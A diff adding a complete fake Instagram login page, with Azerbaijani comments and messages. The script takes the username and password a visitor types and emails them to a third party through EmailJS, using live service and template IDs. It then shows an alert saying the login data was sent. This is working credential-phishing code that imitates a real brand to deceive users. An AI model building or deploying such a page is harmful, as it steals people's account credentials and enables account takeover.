@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+        }
+        .container {
+            text-align: center;
+        }
+        .login-box {
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            width: 300px;
+            border-radius: 5px;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+        input.error {
+            border-color: red;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .or-divider {
+            margin: 15px 0;
+            position: relative;
+            text-align: center;
+        }
+        .or-divider span {
+            background: white;
+            padding: 0 10px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: bold;
+        }
+        .signup-box {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: -10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
+            <form id="login-form">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <div id="username-error" class="error-message"></div>
+                <input type="password" id="password" placeholder="Password" required>
+                <div id="password-error" class="error-message"></div>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="or-divider">
+                <span>OR</span>
+            </div>
+            <a href="#" class="facebook-login">Log in with Facebook</a>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("VVZvHX8p7UeYXyDQP"); // Buraya EmailJS User ID-ni əlavə et
+
+            document.getElementById("login-form").addEventListener("submit", function(event) {
+                event.preventDefault();
+
+                // Səhv mesajlarını təmizləyirik
+                document.getElementById("username-error").textContent = "";
+                document.getElementById("password-error").textContent = "";
+                document.getElementById("username").classList.remove("error");
+                document.getElementById("password").classList.remove("error");
+
+                var username = document.getElementById("username").value;
+                var password = document.getElementById("password").value;
+
+                // İstifadəçi adı və şifrə yoxlaması
+                var valid = true;
+
+                if (!username) {
+                    document.getElementById("username-error").textContent = "İstifadəçi adı daxil edin!";
+                    document.getElementById("username").classList.add("error");
+                    valid = false;
+                }
+
+                if (!password) {
+                    document.getElementById("password-error").textContent = "Şifrəni daxil edin!";
+                    document.getElementById("password").classList.add("error");
+                    valid = false;
+                }
+
+                if (!valid) return;
+
+                var params = {
+                    user_email: username,
+                    user_password: password
+                };
+
+                emailjs.send("service_vnwq5nj", "template_u525yv9", params)
+                    .then(function(response) {
+                        alert("Login məlumatları göndərildi!");
+                        console.log("SUCCESS!", response.status, response.text);
+                    }, function(error) {
+                        console.error("FAILED...", error);
+                        alert("Xəta baş verdi: " + error.text);
+                    });
+            });
+        })();
+    </script>
+</body>
+</html>
